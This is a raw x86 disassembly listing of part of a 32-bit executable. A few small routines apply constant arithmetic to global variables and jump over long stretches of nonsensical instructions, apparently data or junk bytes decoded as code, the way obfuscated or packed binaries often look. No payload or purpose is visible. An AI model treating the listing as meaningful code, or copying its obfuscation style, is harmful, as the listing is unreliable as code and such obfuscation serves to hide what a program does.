  406205:	xor    esp,DWORD PTR [edx+0x66]
  406208:	sbb    DWORD PTR [ebx],0xa15c31b2
  40620e:	pop    ds
  40620f:	xchg   edx,ecx
  406211:	inc    esi
  406212:	outs   dx,DWORD PTR ds:[esi]
  406213:	cmp    BYTE PTR [eax+0x4e],ch
  406216:	rdmsr  
  406218:	cmp    ebx,ebp
  40621a:	push   edi
  40621b:	push   ss
  40621c:	pop    es
  40621d:	test   al,0x8a
  40621f:	and    eax,DWORD PTR [eax]
  406221:	adc    eax,0xc575fc5f
  406226:	(bad)  
  406228:	mov    ecx,0xfa67daa1
  40622d:	stos   DWORD PTR es:[edi],eax
  40622e:	push   eax
  40622f:	cmp    BYTE PTR [esi+0x5795b208],dl
  406235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406236:	add    al,0xc
  406238:	adc    al,0x90
  40623a:	xchg   edi,eax
  40623b:	mov    al,0x58
  40623d:	stos   BYTE PTR es:[edi],al
  40623e:	pop    es
  40623f:	jns    0x406207
  406241:	je     0x4061f6
  406243:	lds    eax,FWORD PTR [ecx+0x7e6dcc7]
  406249:	inc    edx
  40624a:	and    al,0xd5
  40624c:	(bad)  
  40624d:	scas   eax,DWORD PTR es:[edi]
  40624e:	jne    0x406213
  406250:	push   es
  406251:	(bad)  
  406252:	loope  0x4061e4
  406254:	push   eax
  406255:	jo     0x4062b0
  406257:	jge    0x4062ac
  406259:	and    al,0xab
  40625b:	mov    al,ds:0x6c68220e
  406260:	mov    DWORD PTR [ebx+0x5b32d0f],edi
  406266:	aad    0x6a
  406268:	mov    edx,0x301b7410
  40626d:	popa   
  40626e:	inc    ebx
  40626f:	aas    
  406270:	add    DWORD PTR [esi-0x8e2fde3],ecx
  406276:	js     0x4062aa
  406278:	addr16 push edi
  40627a:	dec    ecx
  40627b:	xchg   ecx,eax
  40627c:	sbb    eax,0x4aef24ac
  406281:	xchg   edx,eax
  406282:	repz in al,0xa7
  406285:	sbb    ebp,DWORD PTR [eax]
  406287:	lods   eax,DWORD PTR ds:[esi]
  406288:	push   0x33b33518
  40628d:	push   esp
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	add    eax,0x8c38b532
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406367
  40633b:	in     eax,dx
  40633c:	pop    eax
  40633d:	aad    0x5f
  40633f:	inc    edi
  406340:	jb     0x40636e
  406342:	arpl   WORD PTR [ebp+0x1e],bp
  406345:	sbb    DWORD PTR [edx+0x74],0xffffffbb
  406349:	jp     0x4062dc
  40634b:	cmc    
  40634c:	into   
  40634d:	lea    esp,fs:[ebx]
  406350:	cli    
  406351:	mov    cl,0x9c
  406353:	jecxz  0x4063b6
  406355:	add    eax,0x8f35a197
  40635a:	mov    bl,0x33
  40635c:	sahf   
  40635d:	mov    ebp,0x3eef7223
  406362:	loop   0x4062e9
  406364:	sub    eax,0xec407130
  406369:	das    
  40636a:	fs push ebp
  40636c:	retf   0x10d2
  40636f:	add    al,0xf0
  406371:	gs mov edi,?
  406374:	xchg   edi,eax
  406375:	icebp  
  406376:	cdq    
  406377:	pop    es
  406378:	push   ds
  406379:	nop
  40637a:	sahf   
  40637b:	xor    eax,0x744b572f
  406380:	loopne 0x406326
  406382:	leave  
  406383:	cwde   
  406384:	or     BYTE PTR [ecx],al
  406386:	add    eax,0xfa86af44
  40638b:	add    eax,0x94b3529a
  406390:	mov    esp,0xcf9f83ba
  406395:	pop    esi
  406396:	xchg   ecx,eax
  406397:	sub    BYTE PTR [ecx-0x7f33747b],cl
  40639d:	mov    ecx,0xd2970c51
  4063a2:	lods   eax,DWORD PTR ds:[esi]
  4063a3:	sbb    bh,ah
  4063a5:	sbb    BYTE PTR ds:[esi-0x36699902],0xa9
  4063ad:	sub    ebx,0xffffff95
  4063b0:	fistp  WORD PTR [edx+0x7e]
  4063b3:	jmp    0xaf9c:0x5e0d577f
  4063ba:	adc    al,0xe
  4063bc:	adc    ch,ah
  4063be:	test   BYTE PTR [edx],dl
  4063c0:	mov    DWORD PTR [esi+edx*8-0x7a8969b0],edi
  4063c7:	inc    ebx
  4063c8:	pop    esi
  4063c9:	idiv   DWORD PTR [eax]
  4063cb:	mov    dl,0x81
  4063cd:	dec    esp
  4063ce:	jae    0x406388
  4063d0:	inc    eax
  4063d1:	jecxz  0x4063ca
  4063d3:	fld    TBYTE PTR [ebx+0x3f]
  4063d6:	test   al,0x39
  4063d8:	fadd   DWORD PTR [eax]
  4063da:	push   0xffffffec
  4063dc:	out    dx,eax
  4063dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063de:	shl    BYTE PTR [ebx+edi*4-0x3558d7d3],1
  4063e5:	in     al,dx
  4063e6:	les    edx,FWORD PTR [ebx+0x54bc5382]
  4063ec:	cmp    al,0xc1
  4063ee:	mov    dh,0x9b
  4063f0:	int    0x66
  4063f2:	adc    eax,0x8be8252
  4063f7:	call   0xd88c319a
  4063fc:	lods   eax,DWORD PTR ds:[esi]
  4063fd:	mov    cl,0x8d
  4063ff:	repnz xor dl,BYTE PTR [ebx]
  406402:	hlt    
  406403:	test   DWORD PTR [edi+0x43577899],ecx
  406409:	stos   BYTE PTR es:[edi],al
  40640a:	ror    DWORD PTR [eax+0x4788cda3],cl
  406410:	push   ss
  406411:	cmp    eax,0xb2ec470f
  406416:	pop    es
  406417:	(bad)  
  406418:	(bad)  
  406419:	cmc    
  40641a:	gs jl  0x4063a6
  40641d:	dec    esp
  40641e:	shl    DWORD PTR [ecx],0xb7
  406421:	push   edi
  406422:	daa    
  406423:	arpl   WORD PTR [ecx],si
  406425:	mov    ecx,DWORD PTR [edx]
  406427:	jb     0x40640e
  406429:	mov    DWORD PTR [eax+0x6ead5df0],ebx
  40642f:	xor    al,0x4c
  406431:	push   0x269ae94c
  406436:	jl     0x4063bb
  406438:	les    edi,FWORD PTR [eax]
  40643a:	icebp  
  40643b:	shl    ebp,cl
  40643d:	push   eax
  40643e:	xor    al,cl
  406440:	test   al,0x83
  406442:	push   edi
  406443:	pop    eax
  406444:	fucomip st,st(0)
  406446:	mov    ah,0x1e
  406448:	cmp    al,0x13
  40644a:	and    DWORD PTR [ebx],ebp
  40644c:	sbb    BYTE PTR [ecx],cl
  40644e:	mov    esi,0xd9cc5908
  406453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406454:	mov    ss,WORD PTR [edi]
  406456:	sub    BYTE PTR [eax],al
  406458:	mov    WORD PTR [ecx],?
  40645a:	(bad)  
  40645b:	mov    bh,0xe6
  40645d:	jbe    0x406496
  40645f:	ds (bad) 
  406461:	int    0x85
  406463:	add    dl,BYTE PTR es:[esi]
  406466:	sbb    DWORD PTR [ebp+0x3174403e],esp
  40646c:	fs aad 0x8e
  40646f:	push   edx
  406470:	mov    esp,esp
  406472:	dec    edx
  406473:	inc    edi
  406474:	inc    esp
  406475:	das    
  406476:	call   0xe41e7f62
  40647b:	xchg   ecx,eax
  40647c:	repnz pop ds
  40647e:	xchg   ecx,eax
  40647f:	sub    edx,DWORD PTR ds:0xbe93d4f3
  406485:	ins    BYTE PTR es:[edi],dx
  406486:	pop    edi
  406487:	mov    ds:0x59006ca1,al
  40648c:	inc    edi
  40648d:	push   eax
  40648e:	cmp    ecx,ebp
  406490:	test   ah,bh
  406492:	cli    
  406493:	pop    eax
  406494:	mov    eax,fs
  406496:	inc    esi
  406497:	test   BYTE PTR [ebx+0xd902d63],bl
  40649d:	jmp    0x4064d0
  40649f:	mov    eax,0xb97c7bdb
  4064a4:	push   es
  4064a5:	adc    eax,0x549b6f57
  4064aa:	hlt    
  4064ab:	inc    edx
  4064ac:	or     esi,DWORD PTR [edi]
  4064ae:	shr    ecx,1
  4064b0:	pop    ebp
  4064b1:	sub    eax,0x13cc2548
  4064b6:	add    esp,0x258b9aca
  4064bc:	jg     0x406522
  4064be:	aam    0x92
  4064c0:	adc    DWORD PTR [ebx+ebp*4],esp
  4064c3:	dec    esp
  4064c4:	fptan  
  4064c6:	jg     0x40648a
  4064c8:	rcr    BYTE PTR [eax+ecx*2],1
  4064cb:	jae    0x406526
  4064cd:	rol    BYTE PTR [eax],0x95
  4064d0:	pop    edx
  4064d1:	cwde   
  4064d2:	lods   al,BYTE PTR ds:[esi]
  4064d3:	aam    0x24
  4064d5:	pushf  
  4064d6:	imul   edi,DWORD PTR [ebp+0x69],0xffffffd1
  4064da:	mov    ds:0xc9b3081e,al
  4064df:	rcl    cl,1
  4064e1:	dec    esp
  4064e2:	dec    edx
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	sub    cl,BYTE PTR [esi+0x3a33cfb6]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	data16 (bad) 
  406574:	cdq    
  406575:	mov    ecx,0x6e901c80
  40657a:	daa    
  40657b:	add    ch,0x23
  40657e:	or     bh,BYTE PTR [edx+0x576305a6]
  406584:	adc    eax,0x4c665ed7
  406589:	ja     0x4065d7
  40658b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40658c:	fucomp st(4)
  40658e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658f:	les    esp,FWORD PTR [ebx-0x7057ed0d]
  406595:	sub    ch,BYTE PTR [esi+esi*1-0x3488b909]
  40659c:	sti    
  40659d:	cmp    DWORD PTR [ecx-0x78],ebp
  4065a0:	push   es
  4065a1:	(bad)  
  4065a2:	in     al,0x4a
  4065a4:	nop
  4065a5:	mov    ah,0x1b
  4065a7:	inc    ebx
  4065a8:	shl    DWORD PTR [eax-0x21796d65],cl
  4065ae:	mov    esi,0x34610bda
  4065b3:	cmp    ebp,DWORD PTR [eax+edi*1]
  4065b6:	mov    cl,0xf2
  4065b8:	loopne 0x4065e8
  4065ba:	fst    DWORD PTR [esp+edi*1]
  4065bd:	jge    0x406556
  4065bf:	and    al,0xf7
  4065c1:	push   es
  4065c2:	loope  0x406555
  4065c4:	pop    ds
  4065c5:	sub    BYTE PTR [ebx],al
  4065c7:	ficom  WORD PTR [eax+0x36]
  4065ca:	mov    dl,0xef
  4065cc:	pushf  
  4065cd:	adc    BYTE PTR [ebp-0x61b315f1],ah
  4065d3:	loop   0x4065f6
  4065d5:	and    DWORD PTR ds:0xa0433bb5,edi
  4065db:	mov    bh,0xee
  4065dd:	xchg   edi,eax
  4065de:	dec    esi
  4065df:	fwait
  4065e0:	scas   eax,DWORD PTR es:[edi]
  4065e1:	push   cs
  4065e2:	dec    ebp
  4065e3:	repnz iret 
  4065e5:	popa   
  4065e6:	daa    
  4065e7:	push   esp
  4065e8:	pop    es
  4065e9:	stos   BYTE PTR es:[edi],al
  4065ea:	dec    ebx
  4065eb:	sbb    al,0xbc
  4065ed:	dec    ecx
  4065ee:	ret    
  4065ef:	mov    dl,0x4e
  4065f1:	cwde   
  4065f2:	sbb    al,BYTE PTR [edx+0xa]
  4065f5:	or     ch,BYTE PTR ds:0xb10da0bb
  4065fb:	adc    BYTE PTR [ebx-0x20a94429],dh
  406601:	xor    dl,cl
  406603:	aad    0x52
  406605:	or     al,0xd3
  406607:	popa   
  406608:	mov    dh,0x58
  40660a:	rcr    ah,1
  40660c:	stos   DWORD PTR es:[edi],eax
  40660d:	sbb    DWORD PTR [ebp+0x46ff4ad2],eax
  406613:	push   ds
  406614:	mov    dl,0x2a
  406616:	push   ecx
  406617:	add    BYTE PTR [edi],0xc6
  40661a:	fisttp WORD PTR [esi+0x6159816a]
  406620:	rcr    BYTE PTR [eax-0x7f],1
  406623:	sub    DWORD PTR [edx+0x19],ebx
  406626:	outs   dx,DWORD PTR ds:[esi]
  406627:	adc    edx,DWORD PTR [edx]
  406629:	and    esp,DWORD PTR fs:[ebx-0x52]
  40662d:	aas    
  40662e:	test   BYTE PTR [eax],0x7
  406631:	jnp    0x406663
  406633:	outs   dx,DWORD PTR ds:[esi]
  406634:	ss jo  0x40669f
  406637:	dec    ecx
  406638:	xchg   DWORD PTR [ecx-0x3ed71ec6],esp
  40663e:	arpl   di,bx
  406640:	cmp    al,0x40
  406642:	ret    0x429e
  406645:	fcom   DWORD PTR [edx]
  406647:	jne    0x40669d
  406649:	out    dx,eax
  40664a:	not    DWORD PTR [eax]
  40664c:	fs ss jne 0x40667e
  406650:	cwde   
  406651:	jg     0x4066a0
  406653:	shr    DWORD PTR [edi+0x73475c95],1
  406659:	scas   al,BYTE PTR es:[edi]
  40665a:	sbb    ebx,DWORD PTR [ebp-0x63]
  40665d:	aas    
  40665e:	push   esp
  406660:	mov    ds:0x264e7666,al
  406665:	push   0xbc3c4cec
  40666a:	ret    
  40666b:	popf   
  40666c:	leave  
  40666d:	xor    eax,0xfc0a0893
  406672:	and    eax,0x260c623c
  406677:	ja     0x40662e
  406679:	out    0x78,al
  40667b:	retf   0x8187
  40667e:	mov    BYTE PTR [ebp-0x10e4c74f],al
  406684:	mov    esp,0xbed54db0
  406689:	imul   ebp,DWORD PTR [ebp+0x9d588e9],0x4d
  406690:	push   0xffffff95
  406692:	xor    BYTE PTR [eax+eax*4-0xe],ch
  406696:	mov    ebp,0xa820185
  40669b:	jo     0x406661
  40669d:	lds    ecx,FWORD PTR [ebp+0x52]
  4066a0:	jno    0x4066a5
  4066a2:	out    dx,al
  4066a3:	je     0x40670c
  4066a5:	push   0xb
  4066a7:	das    
  4066a8:	(bad)
  4066ac:	push   es
  4066ad:	sahf   
  4066ae:	cwde   
  4066af:	and    DWORD PTR [ebp+edx*8+0x84b8bdc],eax
  4066b6:	retf   
  4066b7:	test   al,al
  4066b9:	and    bh,BYTE PTR [eax]
  4066bb:	popf   
  4066bc:	in     al,dx
  4066bd:	jnp    0x40671f
  4066bf:	in     al,0x81
  4066c1:	stc    
  4066c2:	fsub   QWORD PTR [ebp+0x2b109943]
  4066c8:	outs   dx,DWORD PTR ds:[esi]
  4066c9:	es in  eax,0xb8
  4066cc:	lods   al,BYTE PTR ds:[esi]
  4066cd:	mov    ds:0xb428fe64,eax
  4066d2:	cld    
  4066d3:	sub    BYTE PTR [esi+0x3c1be500],bh
  4066d9:	dec    edi
  4066da:	sub    al,0xf6
  4066dc:	dec    BYTE PTR [edx]
  4066de:	push   ecx
  4066df:	inc    edi
  4066e0:	jns    0x4066a9
  4066e2:	stc    
  4066e3:	sub    al,BYTE PTR [ebx]
  4066e5:	xchg   ebp,eax
  4066e6:	mov    ebx,DWORD PTR [ebx]
  4066e8:	xchg   esi,eax
  4066e9:	das    
  4066ea:	cmp    dl,bh
  4066ec:	mov    esp,0xcbb6ce71
  4066f1:	dec    esi
  4066f2:	(bad)
  4066f7:	test   al,0x45
  4066f9:	or     al,0x88
  4066fb:	fcomip st,st(2)
  4066fd:	sbb    al,0x78
  4066ff:	jp     0x406756
  406701:	test   eax,0xac708247
  406706:	mov    bl,0xe8
  406708:	add    al,0x59
  40670a:	nop
  40670b:	mov    dl,0x48
  40670d:	pushf  
  40670e:	arpl   WORD PTR [esi],bx
  406710:	jns    0x40674c
  406712:	dec    esi
  406713:	fwait
  406714:	cmp    ebp,0x8
  406717:	std    
  406718:	test   DWORD PTR [edi-0x7a],ecx
  40671b:	and    BYTE PTR [eax],bh
  40671d:	dec    esp
  40671e:	or     BYTE PTR [esi+0x5d],0x97
  406722:	pop    ds
  406723:	add    bh,bh
  406725:	adc    edx,DWORD PTR [ebp-0x34]
  406728:	sbb    al,0x7a
  40672a:	inc    ecx
  40672b:	mov    esi,0x26793fcd
  406730:	adc    ch,BYTE PTR [edi+ebx*2]
  406733:	push   ss
  406734:	ds push eax
  406736:	jno    0x4067a0
  406738:	xchg   ebx,eax
  406739:	outs   dx,DWORD PTR ds:[esi]
  40673a:	js     0x406767
  40673c:	jecxz  0x406722
  40673e:	cs and ebp,ebx
  406741:	xchg   DWORD PTR [edx+0x4482fa4f],edx
  406747:	xchg   DWORD PTR [eax+0x1a],ebx
  40674a:	jbe    0x4066e2
  40674c:	or     ebx,ebp
  40674e:	and    BYTE PTR [ebp+0x53cfdc68],cl
  406754:	mov    ch,0x44
  406756:	mov    edx,DWORD PTR [eax+0x49b8bec2]
  40675c:	sub    DWORD PTR [eax+esi*2-0x1bf3e6a9],ebx
  406763:	inc    ecx
  406764:	mov    ah,0x94
  406766:	fst    DWORD PTR [eax+ebx*1-0x35]
  40676a:	xchg   DWORD PTR [edx+0x90c97b2],edx
  406770:	sub    edx,ebx
  406772:	jecxz  0x406744
  406774:	scas   eax,DWORD PTR es:[edi]
  406775:	imul   eax,DWORD PTR [ecx],0x86e795f4
  40677b:	ins    BYTE PTR es:[edi],dx
  40677c:	ss jnp 0x406718
  40677f:	xchg   esp,eax
  406780:	retf   
  406781:	jecxz  0x406735
  406783:	sbb    eax,0xcf87ee14
  406788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406789:	xlat   BYTE PTR ds:[ebx]
  40678a:	pop    ebp
  40678b:	cmp    BYTE PTR [edi],0x4
  40678e:	xchg   ecx,eax
  40678f:	push   ds
  406790:	xor    BYTE PTR cs:[ebx+edx*4+0x3e],dl
  406795:	mov    cs,WORD PTR [edx-0x4a5ba000]
  40679b:	and    DWORD PTR [eax-0xd04d18f],eax
  4067a1:	dec    ebp
  4067a2:	sbb    BYTE PTR [esi],0xfb
  4067a5:	std    
  4067a6:	and    cl,bh
  4067a8:	push   eax
  4067a9:	sub    edx,DWORD PTR [eax-0x6c]
  4067ac:	lds    ebx,FWORD PTR [ecx-0x6091add7]
  4067b2:	cmp    DWORD PTR [esi],ebx
  4067b4:	jb     0x406736
  4067b6:	push   es
  4067b7:	test   edi,esp
  4067b9:	adc    DWORD PTR [edi+ebx*2+0x6],esi
  4067bd:	mov    cl,0x4b
  4067bf:	ss nop
  4067c1:	or     cl,BYTE PTR [edi+0x36]
  4067c4:	lock or DWORD PTR [ecx],ecx
  4067c7:	(bad)  
  4067c8:	and    eax,0x7fdfb2c8
  4067cd:	in     eax,0xd
  4067cf:	push   0x9fa2744d
  4067d4:	and    al,0xee
  4067d6:	pop    esp
  4067d7:	loop   0x40684b
  4067d9:	pop    ecx
  4067da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067db:	js     0x406787
  4067dd:	adc    DWORD PTR [edx-0x24],ebp
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	cmp    cl,al
  406848:	out    dx,eax
  406849:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	loopne 0x4068b4
  406854:	shl    BYTE PTR [ecx+0x270c6c62],cl
  40685a:	es pop edx
  40685c:	jle    0x406883
  40685e:	and    al,BYTE PTR [esi-0x14a583b0]
  406864:	and    BYTE PTR [esi+0x2b],0x66
  406868:	push   ebp
  406869:	sbb    eax,0xe341710f
  40686e:	push   ss
  40686f:	cmp    eax,0xfeec8ca0
  406874:	loop   0x406863
  406876:	cmp    ch,al
  406878:	xor    ah,BYTE PTR [edi-0x3e]
  40687b:	sbb    ah,bh
  40687d:	cli    
  40687e:	std    
  40687f:	sub    eax,0x7c395bc7
  406884:	out    0x37,al
  406886:	sbb    edi,DWORD PTR [edi-0x30]
  406889:	out    0x2,eax
  40688b:	mov    al,0x59
  40688d:	inc    dl
  40688f:	punpckhdq mm0,QWORD PTR [edx]
  406892:	jecxz  0x4068ad
  406894:	sbb    DWORD PTR [esi],esp
  406896:	push   cs
  406897:	mov    ds:0xe3afb96f,eax
  40689c:	inc    esp
  40689d:	push   es
  40689e:	adc    ebx,DWORD PTR [ebx+0x30]
  4068a1:	push   ecx
  4068a2:	shl    BYTE PTR [edx-0x1],1
  4068a5:	in     eax,dx
  4068a6:	pushf  
  4068a7:	inc    eax
  4068a8:	cdq    
  4068a9:	call   0x87cf:0xc389136
  4068b0:	rcl    DWORD PTR [ecx-0x249512ce],0xa5
  4068b7:	cmp    bl,bh
  4068b9:	sub    esp,DWORD PTR [esi]
  4068bb:	jb     0x4068e3
  4068bd:	add    eax,0x255606ad
  4068c2:	lods   eax,DWORD PTR ds:[esi]
  4068c3:	dec    esi
  4068c4:	cmp    eax,0x82482f06
  4068c9:	push   eax
  4068ca:	aas    
  4068cb:	or     ecx,DWORD PTR [ebx+edi*8]
  4068ce:	lock jo 0x406900
  4068d1:	adc    eax,0xf80fd82
  4068d6:	daa    
  4068d7:	stc    
  4068d8:	inc    ebx
  4068d9:	pop    ebp
  4068da:	std    
  4068db:	les    ebx,FWORD PTR [eax-0x5e399778]
  4068e1:	ins    BYTE PTR es:[edi],dx
  4068e2:	xchg   ebp,eax
  4068e3:	push   ebx
  4068e4:	jb     0x40690d
  4068e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068e7:	dec    esp
  4068e8:	mov    edi,0xc93ea5ac
  4068ed:	mov    esi,0x65d0640b
  4068f2:	push   es
  4068f3:	adc    eax,0xe21f917d
  4068f8:	stos   BYTE PTR es:[edi],al
  4068f9:	or     DWORD PTR [ebx],ebp
  4068fb:	mov    al,bh
  4068fd:	jmp    0x4068aa
  4068ff:	or     al,ch
  406901:	fisubr WORD PTR [ecx]
  406903:	cmp    dl,0xc7
  406906:	jl     0x40696d
  406908:	push   ds
  406909:	cmp    ah,BYTE PTR [ecx+0x25]
  40690c:	jne    0x4068cf
  40690e:	in     al,dx
  40690f:	aas    
  406910:	rol    dl,1
  406912:	bswap  ebx
  406914:	or     al,bl
  406916:	popa   
  406917:	inc    edi
  406918:	mov    al,0x25
  40691a:	cwde   
  40691b:	sbb    cl,BYTE PTR [edi+0x7f]
  40691e:	add    eax,0xc7a81f28
  406923:	repz rol DWORD PTR [eax-0x2c],cl
  406927:	mov    edi,0xb354db79
  40692c:	xor    al,0x57
  40692e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40692f:	dec    ecx
  406930:	sahf   
  406931:	add    eax,0x8e558005
  406936:	or     BYTE PTR [edi+ecx*2],dl
  406939:	popa   
  40693a:	sub    bl,BYTE PTR [edi-0x19]
  40693d:	dec    ebx
  40693e:	sbb    esi,edi
  406940:	lahf   
  406941:	dec    eax
  406942:	or     edi,edi
  406944:	stos   DWORD PTR es:[edi],eax
  406945:	mov    ds:0x57f468a4,eax
  40694a:	and    BYTE PTR [ebx+0x15],0xac
  40694e:	lods   al,BYTE PTR ds:[esi]
  40694f:	jb     0x4068ff
  406951:	push   ebp
  406952:	sbb    eax,0x2ad3abf8
  406957:	inc    esp
  406958:	les    edi,FWORD PTR [edi]
  40695a:	fcmovu st,st(4)
  40695c:	fadd   QWORD PTR [eax+eiz*4-0x77]
  406960:	syscall 
  406962:	mov    ds:0xad596f5a,al
  406967:	lods   al,BYTE PTR fs:[esi]
  406969:	in     eax,0x77
  40696b:	bound  ebx,QWORD PTR [ebx]
  40696d:	mov    ebx,0x32af43e3
  406972:	test   eax,0xaa73957b
  406977:	aaa    
  406978:	adc    esp,DWORD PTR [ebx]
  40697a:	fldcw  WORD PTR [edi-0x21855e1b]
  406980:	ds pop ss
  406982:	sub    DWORD PTR [ebx+ecx*2-0x31],ecx
  406986:	push   edx
  406987:	lds    ebp,FWORD PTR cs:[ecx-0x7c]
  40698b:	xor    dh,BYTE PTR [ecx]
  40698d:	xchg   edi,eax
  40698e:	scas   al,BYTE PTR es:[edi]
  40698f:	push   0xffffffea
  406991:	inc    ecx
  406992:	in     eax,0x5f
  406994:	das    
  406995:	xlat   BYTE PTR ds:[ebx]
  406996:	scas   eax,DWORD PTR es:[edi]
  406997:	pop    edx
  406998:	jmp    0x26b7b563
  40699d:	sti    
  40699e:	test   al,0x9b
  4069a0:	push   ebx
  4069a1:	add    al,0x51
  4069a3:	xor    DWORD PTR [ecx+0x3f738e65],ecx
  4069a9:	mov    ebp,0x98a8b17
  4069ae:	nop
  4069af:	xchg   ecx,eax
  4069b0:	sti    
  4069b1:	sub    eax,0x37331caf
  4069b6:	and    al,0xe2
  4069b8:	dec    ecx
  4069b9:	outs   dx,DWORD PTR ds:[esi]
  4069ba:	pop    edx
  4069bb:	jmp    0x258a:0xbe142ad2
  4069c2:	mov    dh,0x92
  4069c4:	or     al,0x1f
  4069c6:	adc    eax,0xf7121f90
  4069cb:	call   DWORD PTR [eax+0x226d6acc]
  4069d1:	cld    
  4069d2:	mov    cl,0x2d
  4069d4:	jno    0x4069cf
  4069d6:	add    eax,0x5234ed68
  4069db:	add    DWORD PTR [ebp-0xc],esi
  4069de:	xlat   BYTE PTR ds:[ebx]
  4069df:	jno    0x4069e1
  4069e1:	adc    eax,0x5279c6f1
  4069e6:	mov    dl,0x9c
  4069e8:	cmp    al,0x1
  4069ea:	add    bl,BYTE PTR [edi+0x3]
  4069ed:	int3   
  4069ee:	call   0x36732a70
  4069f3:	jp     0x406a32
  4069f5:	xchg   ebp,eax
  4069f6:	jmp    0xb97d8416
  4069fb:	xchg   ecx,eax
  4069fc:	xor    DWORD PTR [ebx-0x43],esp
  4069ff:	add    BYTE PTR [eax-0x734d49bc],0xfe
  406a06:	jbe    0x406a7e
  406a08:	retf   0x83fe
  406a0b:	xor    DWORD PTR [eax+0x2b],edx
  406a0e:	(bad)  
  406a0f:	cli    
  406a10:	xchg   ecx,eax
  406a11:	mov    ds:0x59b732ad,al
  406a16:	pop    es
